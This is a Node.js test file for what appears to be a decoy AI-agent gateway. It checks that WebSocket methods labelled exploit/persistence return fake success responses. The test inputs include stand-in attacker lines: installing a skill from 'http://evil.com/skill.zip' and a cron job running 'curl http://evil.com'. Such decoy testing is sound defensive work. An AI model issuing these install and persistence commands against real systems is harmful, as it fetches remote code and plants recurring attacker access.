import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'
import WebSocket from 'ws'

let app, port, wss

function connectAndCollect(count) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(`ws://127.0.0.1:${port}`)
    const msgs = []
    ws.on('message', (data) => {
      msgs.push(JSON.parse(data.toString()))
      if (msgs.length === count) resolve({ ws, msgs })
    })
    ws.on('error', reject)
  })
}

function sendAndReceive(ws, msg) {
  return new Promise((resolve) => {
    ws.once('message', (d) => resolve(JSON.parse(d.toString())))
    ws.send(JSON.stringify(msg))
  })
}

describe('Step 5 — WS exploit/persistence methods', () => {
  before(async () => {
    const { createGatewayServer } = await import('../src/gateway/http.js')
    const { attachWebSocket } = await import('../src/gateway/websocket.js')
    app = await createGatewayServer()
    await app.listen({ host: '127.0.0.1', port: 0 })
    port = app.server.address().port
    wss = attachWebSocket(app.server)
  })

  after(async () => {
    for (const client of wss.clients) client.terminate()
    wss.close()
    await app.close()
  })

  it('node.invoke returns fake output', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e1', method: 'node.invoke', params: { command: 'ls -la' } })
    assert.equal(res.result.exitCode, 0)
    assert.ok(res.result.output.includes('drwxr-xr-x'))
    ws.terminate()
  })

  it('exec.approvals.list returns array', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e2', method: 'exec.approvals.list', params: {} })
    assert.ok(res.result.includes('node'))
    ws.terminate()
  })

  it('skills.install returns ok', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e3', method: 'skills.install', params: { url: 'http://evil.com/skill.zip' } })
    assert.equal(res.result.ok, true)
    ws.terminate()
  })

  it('cron.create returns ok with nextRun', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e4', method: 'cron.create', params: { schedule: '*/5 * * * *', message: 'curl http://evil.com' } })
    assert.equal(res.result.ok, true)
    assert.ok(new Date(res.result.nextRun).getTime() > Date.now())
    ws.terminate()
  })

  it('send returns delivered', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e5', method: 'send', params: { channel: 'whatsapp', to: '+393331234567', content: 'test' } })
    assert.equal(res.result.ok, true)
    assert.equal(res.result.delivered, true)
    ws.terminate()
  })

  it('web.login.qr returns base64', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e6', method: 'web.login.qr', params: {} })
    assert.ok(res.result.qr.length > 10)
    ws.terminate()
  })

  it('status.get returns snapshot', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e7', method: 'status.get', params: {} })
    assert.ok(res.result.uptimeMs > 0)
    assert.equal(typeof res.result.stateVersion, 'number')
    ws.terminate()
  })

  it('webhook.list returns array', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e8', method: 'webhook.list', params: {} })
    assert.equal(res.result[0].type, 'gmail')
    ws.terminate()
  })

  it('update.run returns updating', async () => {
    const { ws } = await connectAndCollect(1)
    const res = await sendAndReceive(ws, { type: 'req', id: 'e9', method: 'update.run', params: {} })
    assert.equal(res.result.updating, true)
    ws.terminate()
  })
})
